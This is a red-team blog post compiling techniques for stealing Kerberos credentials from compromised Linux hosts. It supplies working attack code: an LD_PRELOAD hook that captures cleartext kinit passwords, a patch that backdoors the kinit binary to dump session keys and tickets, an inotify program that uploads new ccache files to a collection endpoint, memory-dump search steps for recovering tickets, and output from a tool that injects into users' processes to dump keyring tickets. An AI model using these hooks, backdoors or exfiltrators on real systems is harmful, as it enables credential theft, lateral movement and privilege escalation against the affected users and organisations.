---
title: "The Kerberos Credential Thievery Compendium (GNU/Linux)"
date: 2021-01-28 00:00:00 +00:00
modified: 2021-01-28 00:00:00 +00:00
tags: [red team, research, post-explotation, kerberos, X-C3LL]
description: Collection of well-known techniques to steal kerberos credentials in GNU/Linux environments
image: 
---

Dear Fell**owl**ship, today's homily is a compendium of well-known techniques used in GNU/Linux to steal kerberos credentials during post-exploitation stages. Please, take a seat and listen to the story.

# Prayers at the foot of the Altar a.k.a. disclaimer
*The techniques discussed in this article are based on the paper [Kerberos Credential Thievery (GNU/Linux)](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (2017). The approximation of using inotify to steal ccache files, the injection into process to extract tickets from the kernel keyring and the usage of `LD_PRELOAD` have been used by us in real engagements. The rest has been just tested on lab environments.*

# The art of hooking (I): LD_PRELOAD

The first approach that we are going to focus is the usage of **`LD_PRELOAD`** to hook functions related to kerberos, so we can deploy a custom shared object destined to steal plaintext credentials from those programs using kerberos authentication. 

We can check **`kinit`** to locate what functions are susceptible to contain such information:

```
➜  working$ ltrace kinit Administrador@ACUARIO.LOCAL
setlocale(LC_ALL, "")                                                                                                                                                      = "en_US.UTF-8"
strrchr("kinit", '/')                                                                                                                                                      = nil
fileno(0x7fd428706a00)                                                                                                                                                     = 0
isatty(0)                                                                                                                                                                  = 1
fileno(0x7fd428707760)                                                                                                                                                     = 1
isatty(1)                                                                                                                                                                  = 1
fileno(0x7fd428707680)                                                                                                                                                     = 2
isatty(2)                                                                                                                                                                  = 1
set_com_err_hook(0x564277f1d4b0, 0, 0, 0)                                                                                                                                  = 0x7fd42870db30
getopt_long(2, 0x7ffd392b9318, "r:fpFPn54aAVl:s:c:kit:T:RS:vX:CE"..., 0x7ffd392b9090, nil)                                                                                 = -1
krb5_init_context(0x7ffd392b8f50, 0, 1, 0)                                                                                                                                 = 0
krb5_cc_default(0x5642792154a0, 0x7ffd392b8f30, 1, 0)                                                                                                                      = 0
krb5_cc_get_type(0x5642792154a0, 0x5642792156c0, 0x7fd428bdea40, 0)                                                                                                        = 0x7fd4289bf254
krb5_cc_get_principal(0x5642792154a0, 0x5642792156c0, 0x7ffd392b8f38, 0)                                                                                                   = 0
krb5_parse_name_flags(0x5642792154a0, 0x7ffd392bb329, 0, 0x7ffd392b8f68)                                                                                                   = 0
krb5_cc_support_switch(0x5642792154a0, 0x7fd4289bf254, 0x7ffd392bb344, 13)                                                                                                 = 0
krb5_unparse_name(0x5642792154a0, 0x564279216d70, 0x7ffd392b8f70, 0)                                                                                                       = 0
krb5_free_principal(0x5642792154a0, 0x564279216ce0, 0, 0)                                                                                                                  = 0
krb5_get_init_creds_opt_alloc(0x5642792154a0, 0x7ffd392b8f40, 0x564279214010, 0)                                                                                           = 0
krb5_get_init_creds_opt_set_out_ccache(0x5642792154a0, 0x564279216e30, 0x5642792156c0, 0x564279216e80)                                                                     = 0
krb5_get_init_creds_password(0x5642792154a0, 0x7ffd392b8f80, 0x564279216d70, 0 <unfinished ...>
krb5_get_prompt_types(0x5642792154a0, 0x7ffd392b8f30, 0, 0)                                                                                                                = 0x7ffd392b6ec4
krb5_prompter_posix(0x5642792154a0, 0x7ffd392b8f30, 0, 0Password for Administrador@ACUARIO.LOCAL: 
)                                                                                                                  = 0
<... krb5_get_init_creds_password resumed> )                                                                                                                               = 0
kadm5_destroy(0, 0, 0, 3)                                                                                                                                                  = 0x29c251f
krb5_get_init_creds_opt_free(0x5642792154a0, 0x564279216e30, 0, 3)                                                                                                         = 0
krb5_free_cred_contents(0x5642792154a0, 0x7ffd392b8f80, 0x564279214010, 3)                                                                                                 = 0
krb5_free_unparsed_name(0x5642792154a0, 0x564279216e00, 0x7fd428706ca0, 464)                                                                                               = 0
krb5_free_principal(0x5642792154a0, 0x564279216d70, 0x56427921c3d0, 1)                                                                                                     = 0
krb5_cc_close(0x5642792154a0, 0x5642792156c0, 0x564279216df0, 1)                                                                                                           = 0
krb5_free_context(0x5642792154a0, 0, 0x564279215c10, 0)                                                                                                                    = 0
+++ exited (status 0) +++
```

The functions **`krb5_get_init_creds_password`** and **`krb5_prompter_posix`** look interesting. The first is defined as:

```c
krb5_error_code KRB5_CALLCONV
krb5_get_init_creds_password(krb5_context context,
                             krb5_creds *creds,
                             krb5_principal client,
                             const char *password,
                             krb5_prompter_fct prompter,
                             void *data,
                             krb5_deltat start_time,
                             const char *in_tkt_service,
                             krb5_get_init_creds_opt *options)
```

As we can see this function has an argument "password" that is a pointer to a string, but as the [documentation](https://web.mit.edu/kerberos/www/krb5-latest/doc/appdev/refs/api/krb5_get_init_creds_password.html) states this value can be null (in which case a prompt is called, like is doing in `kinit`). This function also uses a pointer to a `krb5_creds` struct that is defined as:

```c
typedef struct _krb5_creds {
    krb5_magic magic;
    krb5_principal client;              /**< client's principal identifier */
    krb5_principal server;              /**< server's principal identifier */
    krb5_keyblock keyblock;             /**< session encryption key info */
    krb5_ticket_times times;            /**< lifetime info */
    krb5_boolean is_skey;               /**< true if ticket is encrypted in
                                           another ticket's skey */
    krb5_flags ticket_flags;            /**< flags in ticket */
    krb5_address **addresses;           /**< addrs in ticket */
    krb5_data ticket;                   /**< ticket string itself */
    krb5_data second_ticket;            /**< second ticket, if related to
                                           ticket (via DUPLICATE-SKEY or
                                           ENC-TKT-IN-SKEY) */
    krb5_authdata **authdata;           /**< authorization data */
} krb5_creds;
```

So we can get the username and (if set) the password used to authenticate. If the password is not provided, we need to check how the prompt is used. The function `krb5_prompter_posix` is defined as:
```c
krb5_error_code KRB5_CALLCONV
krb5_prompter_posix(
    krb5_context        context,
    void                *data,
    const char          *name,
    const char          *banner,
    int                 num_prompts,
    krb5_prompt         prompts[])
```
The [source code](https://github.com/krb5/krb5/blob/28ffafcbd35e82c4feef6591a108fd27b5718f00/src/lib/krb5/os/prompter.c#L31) is easy to understand:

```c
    int         fd, i, scratchchar;
    FILE        *fp;
    char        *retp;
    krb5_error_code     errcode;
    struct termios saveparm;
    osiginfo osigint;

    errcode = KRB5_LIBOS_CANTREADPWD;

    if (name) {
        fputs(name, stdout);
        fputs("\n", stdout);
    }
    if (banner) {
        fputs(banner, stdout);
        fputs("\n", stdout);
    }

    /*
     * Get a non-buffered stream on stdin.
     */
    fp = NULL;
    fd = dup(STDIN_FILENO);
    if (fd < 0)
        return KRB5_LIBOS_CANTREADPWD;
    set_cloexec_fd(fd);
    fp = fdopen(fd, "r");
    if (fp == NULL)
        goto cleanup;
    if (setvbuf(fp, NULL, _IONBF, 0))
        goto cleanup;

    for (i = 0; i < num_prompts; i++) {
        errcode = KRB5_LIBOS_CANTREADPWD;
        /* fgets() takes int, but krb5_data.length is unsigned. */
        if (prompts[i].reply->length > INT_MAX)
            goto cleanup;

        errcode = setup_tty(fp, prompts[i].hidden, &saveparm, &osigint);
        if (errcode)
            break;

        /* put out the prompt */
        (void)fputs(prompts[i].prompt, stdout);
        (void)fputs(": ", stdout);
        (void)fflush(stdout);
        (void)memset(prompts[i].reply->data, 0, prompts[i].reply->length);

        got_int = 0;
        retp = fgets(prompts[i].reply->data, (int)prompts[i].reply->length,
                     fp);
        if (prompts[i].hidden)
            putchar('\n');
        if (retp == NULL) {
            if (got_int)
                errcode = KRB5_LIBOS_PWDINTR;
            else
                errcode = KRB5_LIBOS_CANTREADPWD;
            restore_tty(fp, &saveparm, &osigint);
            break;
        }

        /* replace newline with null */
        retp = strchr(prompts[i].reply->data, '\n');
        if (retp != NULL)
            *retp = '\0';
        else {
            /* flush rest of input line */
            do {
                scratchchar = getc(fp);
            } while (scratchchar != EOF && scratchchar != '\n');
        }

        errcode = restore_tty(fp, &saveparm, &osigint);
        if (errcode)
            break;
        prompts[i].reply->length = strlen(prompts[i].reply->data);
    }
cleanup:
    if (fp != NULL)
        fclose(fp);
    else if (fd >= 0)
        close(fd);

    return errcode;
}
```

As we can see this function receives an array of prompts and then use `fgets()` to read data from a duped STDIN to store the password in a `krb5_data` field inside `krb5_prompt` structure. So we only need to hook this function too and check those structures to get the cleartext password. 

Finally our hook is:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <krb5/krb5.h>

typedef  krb5_error_code (*orig_ftype)(krb5_context context, krb5_creds * creds, krb5_principal client, const char * password, krb5_prompter_fct prompter, void * data, krb5_deltat start_time, const char * in_tkt_service, krb5_get_init_creds_opt * k5_gic_options);
typedef krb5_error_code KRB5_CALLCONV (*orig_ftype_2)(krb5_context context, void *data, const char *name, const char *banner, int num_prompts, krb5_prompt prompts[]);

krb5_error_code krb5_get_init_creds_password(krb5_context context, krb5_creds * creds, krb5_principal client, const char * password, krb5_prompter_fct prompter, void * data, krb5_deltat start_time, const char * in_tkt_service, krb5_get_init_creds_opt * k5_gic_options) {
    krb5_error_code retval;
    orig_ftype orig_krb5;
    orig_krb5 = (orig_ftype)dlsym(RTLD_NEXT, "krb5_get_init_creds_password");
    if (password != NULL) {
        printf("[+] Password %s\n", password);
    }
    retval = orig_krb5(context, creds, client, password, prompter, data, start_time, in_tkt_service, k5_gic_options);
    if (retval == 0) {
    	printf("[+] Username: %s\n", creds->client->data->data);
    }
    return retval;
}


krb5_error_code KRB5_CALLCONV krb5_prompter_posix(krb5_context context, void *data, const char *name, const char *banner, int num_prompts, krb5_prompt prompts[]) {
    krb5_error_code retval;
    orig_ftype_2 orig_krb5;
    orig_krb5 = (orig_ftype_2)dlsym(RTLD_NEXT, "krb5_prompter_posix");
    retval = orig_krb5(context, data, name, banner, num_prompts,prompts);
    for (int i = 0; i < num_prompts; i++) {
        if ((int)prompts[i].reply->length > 0) {
            printf("[+] Password: %s\n", prompts[i].reply->data);
        }
    }
    return retval;
}
```

Let's check it:

```
➜  working$ LD_PRELOAD=/home/vagrant/working/hook_preload.so kinit Administrador@ACUARIO.LOCAL
Password for Administrador@ACUARIO.LOCAL: 
[+] Password: MightyPassword.69
[+] Username: Administrador
```

# The art of hooking (II): binary patching

Another option can be to sustitute a target binary (or a lib) with one backdoored by us. This can be done throught the compilation of a modified version or patching the original. In our case we are going to patch a binary (kinit, for example) with a simple hook using the project [GLORYhook](https://github.com/tsarpaul/GLORYHook) that uses LIEF, Capstone and Keystone under the hood to simplify the process. 

To not repeat the same hook this time we are going to patch kinit so it now will print the keyblock and ticket data after a succesfull authentication:

```c
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <krb5/krb5.h>
 #include <string.h>
 
 krb5_error_code gloryhook_krb5_get_init_creds_password(krb5_context context, krb5_creds * creds, krb5_principal client, const char * password, krb5_prompter_fct prompter, void * data, krb5_deltat start_time, const char * in_tkt_service, krb5_get_init_creds_opt *              k5_gic_options) {
     krb5_error_code retval;
 
     retval = krb5_get_init_creds_password(context, creds, client, password, prompter, data, start_time, in_tkt_service, k5_gic_options);
     if (retval == 0){
         printf("[+] Keyblock (%08jx):\n", (uintmax_t)creds->keyblock.enctype);
         for (int i = 0; i < creds->keyblock.length; i++) {
             printf("%02X", (unsigned char)creds->keyblock.contents[i]);
         }
         printf("\n[+] Ticket:\n");
         for (int i = 0; i < creds->ticket.length; i++) {
             printf("%02X", (unsigned char)creds->ticket.data[i]);
         }
     }
     return retval;
 }
```

Just compile it using the instructions provided by GLORYhook in its readme and test it:

```
➜  working$ gcc -shared -zrelro -znow -fPIC hook-patch.c -o hook_patch.so
➜  working$ python3 GLORYHook/glory.py /usr/bin/kinit ./hook_patch.so  -o ./kinit-backdoored
[+] Beginning merge!
[+] Injecting new PLT
[+] Extending GOT for new PLT
[+] Fixing injected PLT
[+] Injecting PLT relocations
[+] Done!
➜  working$ ./kinit-backdoored administrador@ACUARIO.LOCAL                                  
Password for administrador@ACUARIO.LOCAL: 
[+] Keyblock (00000012):
E8B9D14EDC610C496A2B0426DDDACFA9AA52501A5998A1F1AF44644FF7F117DC
[+] Ticket:
6182046F3082046BA003020105A10F1B0D4143554152494F2E4C4F43414CA2223020A003020102A11930171B066B72627467741B0D4143554152494F2E4C4F43414CA382042D30820429A003020112A103020102A282041B0482041736B5A6CD1C6341E2145C93715ACAED71B1226D277B441D0731D830B819BEB2CC7DCE596C07176095C94E311BA05D45BDD951503FF5B2C8A6601EF39AA9316C2D0EAAD279279F1C5EB82BD133B637E98E4E672F08E047A0DD4D72612D9349F90E62753DBB8054860D82E7FE023694A175923236E84D55F047FF25AB6C801B4A14BA0526BF14C15015EE15EB723C783170820335A7272E54279CA17E3C4C8AB6079BED4FC0D8238FAD3B1D0F9FAB0B0AEC7603010F056F8F2B9F96B6BC03A5B3918382646078F62017EC0D11C05EDDCE01F77A88458D9EA476CF8E002BEE4F3886C0294344D8AC0840151AECC7090223240F6E3C4287320F840ACEA4C61FF7BA02E01EF4E6D203C13DEA9BFF9FE9A9F60F918A70FB9202C6C9EA5098735CAD0D7FA089C5F6EF87470413F3BF939FBC57060A341D0640E17F4106B5CAF46BC1DBB418D5B083B885D9A146A54C455F5D8E929889092FE4E2636CBC6CBD8CA599617D478D0194904FFAC35E4663FF6BB551E558D21E137BEE5600DCBBCE939B5A09DC3301FBB234AFF83985DF819B9C105FF18564E5C5B94DDE9DE690FAA3E0A21392ABCAD17F9A6975898BD59D743FA715001ABDD1321BFA4F70B4997B7BCA573EBAD3D5F57DC35429D4B1CEB2F7577352385C8DAA19326CA240A7AB4F1230C22CC14581BF66C52565F26835D24CB63FCC6535590C4C06C01EF325B8DE8C77D5DF82309F13C2080C599A2C69889A1E743EEFC4A5119B1EE418DE3748A2CAF75C50EA7E9E966DD40088C6C85EE8BB24859C032AB417EBEA08FD79506EFC6B34B1E8D57979D9D4EBC9822A50C23D0C71D188DB3DEFC5CFC49D422488D4AA4E90865601B51A9752957BECDF2AA5C41B0FD8F6F27EEAF5CB8E09F2453025B5FDF05EF9D693E91EE5C9D62E93097EBDBAC498F9D7E7F1A0FA54B7C2D3F7925C0A0AD48E792FFF833981793880F9A0A87CF0D8758BF73E5BAD095F95673172BF8DBCFE89F7B806BC3DC976CB7DA360DF1058B962E8E8B71A1D1DB903EC53DE343EA787C234DB239FB2758E7E70C13CA08CED1F9AD3D4228BCC54D098899C8E20A4EC494996572EC510AF2C88A9B1718EA4FA74C91F1789433151AAD3C99AD4BB1E57E41A7C40595D073E9E417383E2CB98D2886A643DE5A54270137D84DD510C6ED687D47462E9E03E559A0D5CFD44855308EE6A32F096A1FF04FBBE556945E667D7F3E3EC8ED6D30CD7BCE6A617ADDA5216D296E6F627D8EFDDECF392872E081020D7255D6AE604BD76A281CE1D7B38BA39F5C6D6C9317F4B1E01D56C90D4D0EA5425BD8C7A3391EB682B087C6A4FA9A586515338322D27A396F65E69681DD2A4E4EA73B163A756A709232F4C6C56515E06AD4CC4F96B391F848DBAB73810AC3AC10D8FD7ACCA32A8D68F7DC2CF01A285E78F2F770CD322A2EF790A5A69EC91786D5180BFF1B76E6112BA008EFF0B7D7F2C01217AB57EE37D0BB082%     
```

# Playing with the ccache (I): files

The most common way to save kerberos tickets in linux environments is with ccache files. The ccache files by default are in /tmp with a format name like `krb5cc_%UID%` and they can be used directly by the majority of tools based in the Impacket Framework, so we can read the file contents to move laterally (or even to escalate privileges if we are lucky enough to get a TGT from a privileged user) and execute commands via psexec.py/smbexec.py/etc. But if no valid tickets are found (they have a lifetime relatively short) we can wait and set an `inotify` watcher to detect every new generated ticket and forward them to our C&C via https/dns/any-covert-channel.

```c
// Example based on https://www.lynxbee.com/c-program-to-monitor-and-notify-changes-in-a-directory-file-using-inotify/
// Originally this code was posted by our owl @TheXC3LL at his own blog (https://x-c3ll.github.io/posts/rethinking-inotify/)
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <limits.h>
#include <unistd.h>
#include <fcntl.h>
#include <curl/curl.h>

#define MAX_EVENTS 1024 /*Max. number of events to process at one go*/
#define LEN_NAME 1024 /*Assuming length of the filename won't exceed 16 bytes*/
#define EVENT_SIZE  ( sizeof (struct inotify_event)  ) /*size of one event*/
#define BUF_LEN     ( MAX_EVENTS * ( EVENT_SIZE + LEN_NAME  ) ) /*buffer to store the data of events*/

#define endpoint "http://localhost:4444"

int exfiltrate(char* filename) {
    CURL *curl;
    CURLcode res;
    struct stat file_info;
    FILE *fd;

    fd = fopen(filename, "rb");
    if(!fd){
        return -1;
    }
    if(fstat(fileno(fd), &file_info) != 0) {
        return -1;
    }
    curl = curl_easy_init();
    if (curl){
        curl_easy_setopt(curl, CURLOPT_URL, endpoint);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_READDATA, fd);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            return -1;
        }
        curl_easy_cleanup(curl);
    }       
    fclose(fd);
    return 0;
}

int main(int argc, char **argv){
    int length, i= 0, wd;
    int fd; 
    char buffer[BUF_LEN];
    char *ticketloc = NULL;

    printf("[Kerberos ccache exfiltrator PoC]\n\n");
   
    //Initiate inotify
    if ((fd = inotify_init()) < 0) {
        printf("Could not initiate inotify!!\n");
        return -1;
    }

    //Add a watcher for the creation or modification of files at /tmp folder
    if ((wd = inotify_add_watch(fd, "/tmp", IN_CREATE | IN_MODIFY)) == -1) {
        printf("Could not add a watcher!!\n");
        return -2;
    }

    //Main loop 
    while(1) {
        i = 0;
        length = read(fd, buffer, BUF_LEN);
        if (length < 0) {
            return -3;
        }

        while (i < length) {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];
            if (event->len) {
                    //Check for prefix
                    if (strncmp(event->name, "krb5cc_", strlen("krb5cc_")) == 0){
                        printf("New cache file found! (%s)", event->name);
                        asprintf(&ticketloc, "/tmp/%s",event->name);
                        //Forward it to us
                        if (exfiltrate(ticketloc) != 0) {
                            printf(" - Failed!\n");
                        }
                        else {
                            printf(" - Exfiltrated!\n");
                        }
                        free(ticketloc);
                    }
                i += EVENT_SIZE + event->len;
            }
        }
    }

}
```

# Playing with the ccache (II): memory dumps

If the ticket is only cached by the process (because no other process needs to access to it) it is posible to retrieve it from a memory dump. In the paper that we mentioned earlier ([Kerberos Credential Thievery (GNU/Linux)](https://www.delaat.net/rp/2016-2017/p97/report.pdf)) they follow an approach based on scanning the dumped memory by an sliding window with the size of the keyblock and ticket and then calculate the entropy of those frames to find plausible candidates. With the candidates a ccache file is recreated and tried until all posibilities are emptied. 

In our humble opinion this method is a bit overkill and convoluted. A far more simple technique can be to scan the dumped memory to find a pattern inside the `krb5_creds` structure and then locate the pointers to the keyblock and ticket, extract them and create a ccache file. Let's explain it.

As we said before a `krb5_creds` structure has this definition:

```c
typedef struct _krb5_creds {
    krb5_magic magic;
    krb5_principal client;              /**< client's principal identifier */
    krb5_principal server;              /**< server's principal identifier */
    krb5_keyblock keyblock;             /**< session encryption key info */
    krb5_ticket_times times;            /**< lifetime info */
    krb5_boolean is_skey;               /**< true if ticket is encrypted in
                                           another ticket's skey */
    krb5_flags ticket_flags;            /**< flags in ticket */
    krb5_address **addresses;           /**< addrs in ticket */
    krb5_data ticket;                   /**< ticket string itself */
    krb5_data second_ticket;            /**< second ticket, if related to
                                           ticket (via DUPLICATE-SKEY or
                                           ENC-TKT-IN-SKEY) */
    krb5_authdata **authdata;           /**< authorization data */
} krb5_creds;
```
And `krb5_keyblock` is defined as:

```c
typedef struct _krb5_keyblock {
    krb5_magic magic;
    krb5_enctype enctype;
    unsigned int length;
    krb5_octet *contents;
} krb5_keyblock;
```

If everything is ok the magic value will be zero, and the enctype is a known value based on the encryption used (for example, 0x17 is rc4-hmac, 0x12 is aes256-sha1, etc.) so only a small subset of values are valid (indeed you can find all [here](https://www.opencore.com/blog/2017/3/kerberos-encryption-types/), there are less than 20) and the keyblock size is fixed (it will be only a well-known value like 32 bytes). If we translate this structure to the memory layout we are going to have a structure that starts with **`00000000 XX000000 YY00000000000000`**, being XX the enctype and YY the length. So, for example, if we request a ticket with aes256-sha1 our `krb5_keyblock` structure will start with **`00000000120000002000000000000000`**. And this is a pattern that we can use as reference **:)**

```c
pwndbg> search -x "00000000120000002000000000000000"
[stack]         0x7fffffffdb78 0x1200000000
```

Here is the beginning of our `krb5_block` (that is inside the `krb5_creds`). So, at this address plus 16 bytes, is the pointer to the keyblock contents (`krb5_octet *contents`):

```c
pwndbg> x/1g 0x7fffffffdb78+16
0x7fffffffdb88: 0x000055555956f3e0
```
So now we can retrieve the the keyblock content:

```c
pwndbg> x/4g 0x000055555956f3e0
0x55555956f3e0: 0x77a5e74f160548a7      0x49980e2202bb7c46
0x55555956f3f0: 0x6e2d067a19e01e0d      0x79a3a2f8503cd0d0
``` 

If we recall the `krb5_creds` uses a `krb5_data` structure to hold the ticket information (magic, length and pointer to the ticket itself). This pointer to the ticket data is at our pattern plus 64 bytes:

```c
pwndbg> x/1g 0x7fffffffdb78+64
0x7fffffffdbb8: 0x000055555956ea00
```

And finally our desired ticket:

```c
pwndbg> x/100x 0x000055555956ea00
0x55555956ea00: 0x61    0x82    0x04    0x6f    0x30    0x82    0x04    0x6b
0x55555956ea08: 0xa0    0x03    0x02    0x01    0x05    0xa1    0x0f    0x1b
0x55555956ea10: 0x0d    0x41    0x43    0x55    0x41    0x52    0x49    0x4f
0x55555956ea18: 0x2e    0x4c    0x4f    0x43    0x41    0x4c    0xa2    0x22
0x55555956ea20: 0x30    0x20    0xa0    0x03    0x02    0x01    0x02    0xa1
0x55555956ea28: 0x19    0x30    0x17    0x1b    0x06    0x6b    0x72    0x62
0x55555956ea30: 0x74    0x67    0x74    0x1b    0x0d    0x41    0x43    0x55
...
```

The size is located just before the pointer, so you can retrieve it to know how much memory to dump. 


# Playing with the ccache (III): kernel keyrings

Programas can use in-kernel storage inside keyrings because it offers far more proteccion than the storage via ccache files. This kind of storage has the advantage that only the user can acces to this information via `keyctl`. To thief those juicy tickets we can inject a small stub of code inside processes owned by each user in the compromised machine, and this code will ask the tickets. Easy peasy!

Our friend [@Zer1t0](https://twitter.com/zer1t0) developed a tool called [Tickey](https://github.com/Zer1t0/tickey/tree/master/tickey) that does all this job for us:

```c
➜  working# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in vagrant[1000] session...
[+] Successful injection at process 15547 of vagrant[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in pelagia[1120601337] session...
[+] Successful injection at process 58779 of pelagia[1120601337],look for tickets in /tmp/__krb_1120601337.ccache
[*] Trying to inject in aurelia[1120601122] session...
[+] Successful injection at process 15540 of aurelia[1120601122],look for tickets in /tmp/__krb_1120601122.ccache
[X] [uid:0] Error retrieving tickets
```

# EoF

We hope you enjoyed this reading! Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).










